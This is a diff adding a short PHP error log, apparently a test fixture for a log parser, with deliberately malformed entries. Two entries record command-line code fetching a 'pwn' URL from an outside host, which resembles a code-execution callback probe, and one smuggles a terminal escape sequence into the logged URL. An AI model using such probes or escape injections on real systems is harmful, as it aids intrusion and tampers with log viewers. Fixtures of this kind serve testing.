@@ -1,0 +1,13 @@
+[26-Oct-2026 11:00:59 Europe/Berlin] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0
+[26-Oct-2026 11:01:00 Europe/Berlin] PHP Warning:  PHP Request Startup: Session ID is too long or contains illegal characters. Only the A-Z, a-z, 0-9, "-", and "," characters are allowed in Unknown on line 0
+[26-Oct-2026 11:01:00 Europe/Berlin] PHP Warning:  PHP Request Startup: Failed to read session data: files (path: /tmp) in Unknown on line 0
+[26-Oct-2026 11:02:00 Europe/Berlin] PHP Warning:  POST Content-Length of 33128677 bytes exceeds the limit of 8388608 bytes in Unknown on line 0
+[26-Oct-2026 11:03:00 Europe/Berlin] PHP Warning:  file_get_contents(http://198.51.100.99:8080/pwn-203.0.113.30): Failed to open stream: Connection timed out in Command line code on line 1
+[26-Oct-2026 11:04:00 Europe/Berlin] PHP Notice:  Undefined index: page in /var/www/html/index.php on line 12
+[26-Oct-2026 11:06:00 Europe/Berlin] WordPress database error Table 'wp.wp_options' doesn't exist for query SELECT option_value FROM wp_options WHERE option_name = 'siteurl' LIMIT 1 made by require('wp-blog-header.php')
+[26-Oct-2026 11:07:00] PHP Warning:  foo in /var/www/html/x.php on line 3
+[26-Oct-2026 11:08:00 +09:00] PHP Fatal error:  Uncaught Exception: boom in /var/www/html/x.php:3
+Stack trace:
+#0 {main}
+  thrown in /var/www/html/x.php on line 3
+[26-Oct-2026 11:09:00 Europe/Berlin] PHP Warning:  file_get_contents(http://198.51.100.99:8080/]0;pwned): Failed to open stream: Connection timed out in Command line code on line 1
